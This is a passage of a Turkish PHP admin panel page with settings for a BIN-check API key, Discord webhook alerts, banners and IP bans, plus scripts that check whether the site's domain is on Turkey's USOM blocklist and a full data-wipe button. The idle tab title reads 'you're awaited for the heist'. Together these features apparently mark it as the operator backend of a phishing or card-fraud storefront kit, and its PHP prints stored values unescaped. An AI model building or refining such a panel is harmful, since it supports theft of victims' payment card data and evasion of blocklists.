                          <label class="form-check-label" for="discord_webhook_aktif">Aktif</label>
                        </div>
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="radio" id="discord_webhook_deaktif" name="discord_webhook" value="de-aktif" onclick="form.submit();" <?php if($QueryServer["discord_webhook"] == 0) { echo("checked"); } ?>>
                          <label class="form-check-label" for="discord_webhook_deaktif">De-Aktif</label>
                        </div>
                      </div>
                    </div>
                   </form>

                   <form method="POST">
                    <div class="mb-4">
                      <label class="form-label" data-bs-toggle="tooltip" data-bs-animation="true" data-bs-placement="top" title="Bu ayarı açarsanız anasayfadaki banneri aktifleştirmiş olursunuz.">Banner</label>
                      <div class="space-y-2">
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="radio" id="banner_durum_aktif" name="banner_durum" value="aktif" onclick="form.submit();" <?php if($QueryServer["banner_durum"] == 1) { echo("checked"); } ?>>
                          <label class="form-check-label" for="banner_durum_aktif">Aktif</label>
                        </div>
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="radio" id="banner_durum_deaktif" name="banner_durum" value="de-aktif" onclick="form.submit();" <?php if($QueryServer["banner_durum"] == 0) { echo("checked"); } ?>>
                          <label class="form-check-label" for="banner_durum_deaktif">De-Aktif</label>
                        </div>
                      </div>
                    </div>
                   </form>

                   <?php endif; ?>
                  </div>
                </div>
                <div class="block-content tab-pane" id="ip-banla" role="tabpanel" aria-labelledby="ip-banla-buton" tabindex="0">
                  <h4 class="fw-semibold">IP Banla</h4>
                  <form method="POST" class="ip-banla">
                    <div class="mb-3 col-md-4">
                      <label class="form-label" for="ip-ban">IP Adresi</label>
                      <input type="text" class="form-control" id="ip-ban" name="ip-ban" pattern="^(?!0)(?!.*\.$)((1?\d?\d|25[0-5]|2[0-4]\d)(\.|$)){4}$" title="Bu alana sadece IP adresi girebilirsin. Örnek: 1.1.1.1" placeholder="IP Adresi" required>
                    </div>
                    <div class="mb-4">
                      <button type="submit" class="btn btn-sm btn-success">
                      <i class="fa fa-fw fa-check me-1"></i> Onayla
                      </button>
                    </div>
                  </form>
                </div>
                <div class="block-content tab-pane" id="isyeri-adi-degistir" role="tabpanel" aria-labelledby="isyeri-adi-degistir-buton" tabindex="0">
                  <h4 class="fw-semibold">İşyeri Adı Değiştir</h4>
                  <form method="POST" class="isyeri-adi-degistir">
                    <div class="mb-3 col-md-4">
                      <label class="form-label" for="isyeri-adi">İşyeri Adı</label>
                      <input type="text" class="form-control" id="isyeri-adi" name="isyeri-adi" placeholder="İşyeri Adı" value="<?php echo $QueryServer['isyeri_adi']; ?>">
                    </div>
                    <div class="mb-4">
                      <button type="submit" class="btn btn-sm btn-success">
                      <i class="fa fa-fw fa-check me-1"></i> Onayla
                      </button>
                    </div>
                  </form>
                </div>
                <div class="block-content tab-pane" id="bin-check-api" role="tabpanel" aria-labelledby="bin-check-api-buton" tabindex="0">
                  <h4 class="fw-semibold">BIN Check Api Key</h4>
                  <form method="POST">
                    <div class="mb-3 col-md-4">
                      <label class="form-label" for="isyeri-adi">BIN Check Api Key</label>
                      <input type="text" class="form-control" id="bank_api_key" name="bank_api_key" placeholder="BIN Check Api Key" value="<?php echo $QueryServer['bank_api_key']; ?>">
                    </div>
                    <div class="mb-4">
                      <button type="submit" class="btn btn-sm btn-success">
                      <i class="fa fa-fw fa-check me-1"></i> Onayla
                      </button>
                    </div>
                  </form>
                </div>
                <div class="block-content tab-pane" id="banner-degistir" role="tabpanel" aria-labelledby="banner-degistir-buton" tabindex="0" style="display: <?php echo $check_banner_config; ?>">
                  <h4 class="fw-semibold">Banner URL Değiştir</h4>
                  <form method="POST">
                    <div class="mb-3 col-md-4">
                      <label class="form-label" for="banner_url">Banner URL</label>
                      <input type="text" class="form-control" id="banner_url" name="banner_url" placeholder="Banner URL" value="<?php echo $QueryServer['banner_url']; ?>">
                    </div>
                    <div class="mb-4">
                      <button type="submit" class="btn btn-sm btn-success">
                      <i class="fa fa-fw fa-check me-1"></i> Onayla
                      </button>
                    </div>
                  </form>

                  <h4 class="fw-semibold">Banner Yönlendirme</h4>
                  <form method="POST">
                    <div class="mb-3 col-md-4">
                      <label class="form-label" for="banner_url2">Banner Yönlendirme ID ( Ürün IDsi yazınız )</label>
                      <input type="text" class="form-control" id="banner_url2" name="banner_url2" placeholder="Banner Yönlendirme ID" value="<?php echo $QueryServer['banner_yonlendirme']; ?>">
                    </div>
                    <div class="mb-4">
                      <button type="submit" class="btn btn-sm btn-success">
                      <i class="fa fa-fw fa-check me-1"></i> Onayla
                      </button>
                    </div>
                  </form>

                  
                </div>
                
                <div class="block-content tab-pane" id="discord-webhook" role="tabpanel" aria-labelledby="discord-webhook-buton" tabindex="0" style="display: <?php echo $check_discord_config; ?>">
                  <h4 class="fw-semibold">Discord Webhook Linki</h4>
                  <form method="POST" class="discord-webhook-degistir">
                    <div class="mb-3 col-md-4">
                      <label class="form-label" for="discord-webhook-url">Discord Webhook Linki</label>
                      <input type="text" class="form-control" id="discord-webhook-url" name="discord-webhook-url" placeholder="<?php echo $QueryServer['discord_webhook_url']; ?>" value="<?php echo $QueryServer['discord_webhook_url']; ?>">
                    </div>
                    <div class="mb-4">
                      <button type="submit" class="btn btn-sm btn-success">
                        <i class="fa fa-fw fa-check me-1"></i> Onayla
                      </button>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <footer id="page-footer" class="bg-body-light">
        <div class="content py-3">
          <div class="row fs-sm">
            <div class="col-sm-6 order-sm-2 py-1 text-center text-sm-end"> Kullanıcı: <a class="fw-semibold link-fx" href="javascript:void(0)"><?php echo $QueryClient['kullanici_adi']; ?></a>
            </div>
            <div class="col-sm-6 order-sm-1 py-1 text-center text-sm-start">
              <a class="fw-semibold link-fx" href="javascript:void(0)">monke</a> &copy; <span data-toggle="year-copy"></span>
            </div>
          </div>
        </div>
      </footer>
    </div>
    <script type="text/javascript">
      document.getElementById("check_usom").addEventListener("click", function(e) {
        var domain = window.location.host;

        One.helpers('jq-notify', {type: 'warning', icon: 'fa fa-rotate me-1', message: 'USOM kontrolü yapılıyor!'});

        e.preventDefault();
        
        $.ajax({
          type: "POST",
          url: "./function/CheckUsom.php",
          data: {
            domain: domain
          },
          success: function (data) {
            if(data === "yasaklandi") {
              One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-times me-1', message: "Domain USOM tarafından yasaklanmış durumda."});
            } else if(data === "yasaklanmadi") {
              One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: "Domain USOM tarafından yasaklanmadı."});
            } else if(data === "baglanti hatasi") {
              One.helpers('jq-notify', {type: 'danger', icon: 'fa fa-check me-1', message: "USOM ile bağlantı kurulamadı!"});
            }
          }
        });
      });
      var title = document.title;
      var alttitle = "Vurgun için bekleniyorsun ;)";
      window.onblur = function () { 
        document.title = alttitle;
      };
      window.onfocus = function () { 
        document.title = title;
      };
      function SifreOlustur() {
        One.helpers('jq-notify', {type: 'success', icon: 'fa fa-check me-1', message: 'Şifre oluşturma işlemi başarılı!'});
        document.getElementById("sifre").value = SifreOlusturMain()
        document.getElementById("sifre").select();
        document.getElementById("sifre").setSelectionRange(0, 99999);
        navigator.clipboard.writeText(document.getElementById("sifre").value);
      }
      function SifreOlusturMain( len ) {
        var length = (len)?(len):(10);
        var string = "abcdefghijklmnopqrstuvwxyz";
        var numeric = '0123456789';
        var punctuation = '!@#$%^&*~`?><=';
        var password = "";
        var character = "";
        var crunch = true;
        while( password.length<length ) {
            entity1 = Math.ceil(string.length * Math.random()*Math.random());
            entity2 = Math.ceil(numeric.length * Math.random()*Math.random());
            entity3 = Math.ceil(punctuation.length * Math.random()*Math.random());
            hold = string.charAt( entity1 );
            hold = (password.length%2==0)?(hold.toUpperCase()):(hold);
            character += hold;
            character += numeric.charAt( entity2 );
            character += punctuation.charAt( entity3 );
            password = character;
        }
        password = password.split('').sort(function(){return 0.5-Math.random()}).join('');
        return password.substr(0,len);
      }
      document.getElementById("factory_reset").addEventListener("click", function(e) {
        Swal.fire({
          title: 'Emin misin?',
          text: "Bu işlemi geri alamıyacaksın ve bütün veriler silinecektir!",
          icon: 'warning',
          showCancelButton: true,
          confirmButtonColor: '#3085d6',
          cancelButtonColor: '#d33',
          confirmButtonText: 'Evet',
          cancelButtonText: 'Hayır'
        }).then((result) => {
          if (result.isConfirmed) {
            e.preventDefault();
            $.ajax({
              type: "POST",
              url: "./function/FactoryReset.php",
              data: {
                izin: true
              },
              success: function (data) {
                Swal.fire({
                  title: 'İşlem Başarılı!',
                  text: "Bütün veriler başarıyla silindi.",
                  icon: 'success',
                  confirmButtonColor: '#3085d6',
                  confirmButtonText: 'Tamam'
                }).then((result) => {
                  if (result.isConfirmed) {
                    window.location.href = 'quit';
                  }
                })
              }
            });
          }
        })
      });
    </script>
    <script src="assets/js/oneui.app.min.js"></script>
    <script src="assets/js/lib/jquery.min.js"></script>
    <script src="assets/js/plugins/jquery-validation/jquery.validate.min.js"></script>
    <script src="assets/js/pages/kullanici-duzenleme.min.js"></script>
    <script src="assets/js/pages/isyeri-adi-degistir.min.js"></script>
    <script src="assets/js/pages/discord-webhook-degistir.min.js"></script>
    <script src="assets/js/plugins/bootstrap-notify/bootstrap-notify.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script>One.helpersOnLoad(['jq-notify']);</script>
  </body>
</html>